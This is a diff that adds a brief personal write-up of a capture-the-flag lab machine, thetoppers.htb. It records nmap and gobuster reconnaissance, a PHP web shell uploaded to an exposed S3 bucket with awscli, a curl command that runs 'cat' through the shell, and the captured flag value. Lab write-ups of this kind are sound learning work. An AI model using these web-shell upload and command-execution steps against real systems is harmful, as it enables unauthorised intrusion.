@@ -1,0 +1,4 @@
+I learned the most with this machine, path-traversal, web-shell, how to attach domain names to ip when there is no dns server i:e nano /etc/hosts, AWS S3, reverse shell and file hosting with python HTTP module
+i started off with basic nmap sV -sC -O <ip> then i got the info on ports and versions and os, then i used gobuster vhost to find what the sub domains were and found s3, so AWS S3 and then i use awscli but got no results really so again used gobuster but with dir flag to find more info on the aws service, found .php files and then made a web shell with php, uploaded it with aws --endpoint-url 'http://s3.thetoppers.htb' s3 cp shell.php s3://thetoppers.htb
+upload: ./shell.php to s3://thetoppers.htb/shell.php since now i can interact with it, with the self made shell, i used path traversal finally to get the flag.txt  curl http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
+a980d99281a28d638ac68b9bf9453c2b
